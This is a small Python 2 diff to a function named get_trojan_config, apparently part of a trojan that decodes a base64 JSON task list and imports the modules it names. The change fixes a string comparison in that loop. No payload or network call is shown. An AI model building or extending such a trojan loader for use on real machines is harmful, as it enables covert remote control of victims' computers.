@@ -48,8 +48,10 @@ def get_trojan_config():
     config      = json.loads(base64.b64decode(config_json))
     configured  = True
     print config
+
     for task in config:
-        if task['module'] is u'None':
+
+        if task['module'] == "None":
             continue
         print task['module']
         if task['module'] not in sys.modules:
